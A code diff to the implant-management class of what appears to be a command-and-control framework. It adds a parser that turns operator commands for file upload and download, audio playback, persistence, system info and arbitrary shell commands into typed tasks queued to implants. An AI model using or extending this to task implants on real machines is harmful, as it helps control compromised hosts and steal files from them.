@@ -24,8 +24,9 @@ class ImplantManagement:
                 return None
         return None
 
-    def _validate_command(self, command):
+    def _OLD_validate_command(self, command):
         # -- TODO: Check if type needs to be enforced.
+        # This will be used to generate the diction to be added to the DB -This will use to the new Dwarven Blacksmith implant comms.
         special_cmd = ["sys_info", "enable_persistence"]
         if command[0:2] == "::":
             preprocessed_command = command[2:].lower().strip()
@@ -33,7 +34,52 @@ class ImplantManagement:
                 postprocessed_command = ":: "+preprocessed_command
                 return postprocessed_command, True
             return command, {"cmd_reg": {"result": False, "reason": "Unknown inbuilt command, i.e. '::'"}}
+        # Dwarven Blacksmith changes:
+        # Each new custom command will be created as a diction with command type and any args required
         return command, True
+
+    def _validate_command(self, command):
+        command_listing = [
+            {
+                "type": "FU",
+                "args": "base64-file::filelocation",
+                "input": "upload_file"
+            },
+            {
+                "type": "FD",
+                "args": "base64 target file",
+                "input": "download_file"
+            },
+            {
+                "type": "PS",
+                "args": "sound file    location (on Fudge)",
+                "input":"play_audio"
+            },
+            {
+                "type": "EP",
+                "args": None,
+                "input":"enable_persistence"
+            },
+            {
+                "type": "SI",
+                "args": None,
+                "input":"sys_info"
+            }
+        ] # FU,FD,PS,EP,SI
+
+        # Process command output into:
+        if command.lstrip()[0:2] == "::":
+            preprocessed_command = command.lstrip()[2:].lower().strip()
+            for x in command_listing:
+                if x['input'] in preprocessed_command:
+                    a = preprocessed_command.partition(x['input'])
+                    r_command = { "type":x['type'], "args":a[2]}
+                    return r_command, True
+            return command, {"cmd_reg": {"result": False, "reason": "Unknown inbuilt command, i.e. '::'"}}
+        else:
+            r_command = {"type": "CM", "args": command}
+
+        return r_command, True
 
     def ImplantCommandRegistration(self, cid, username, form):
         # -- This should be refactored at a later date to support read/write changes to
@@ -49,6 +95,7 @@ class ImplantManagement:
             # -- before checking the database assess the cmd that was input.
             if len(form['cmd']) == 0:
                 return {"cmd_reg": {"result": False, "reason": "No command submitted."}}
+
             processed_command, validated_command = self._validate_command(form['cmd'])
             if validated_command is not True:
                 return validated_command
@@ -58,9 +105,11 @@ class ImplantManagement:
                 list_of_implants = self.db.implant.Get_AllGeneratedImplantsFromCID(cid)
             else:
                 list_of_implants = self.db.implant.Get_AllImplantIDFromTitle(form['ImplantSelect'])
+
             # -- Access if this can fail. If empty return error.
             if len(list_of_implants) == 0:
                 return {"cmd_reg": {"result": False, "reason": "No implants listed."}}
+
             for implant in list_of_implants:
                 # -- Create return from the Implant.AddCommand() method.
                 self.Imp.AddCommand(username, cid, implant['unique_implant_id'], processed_command)
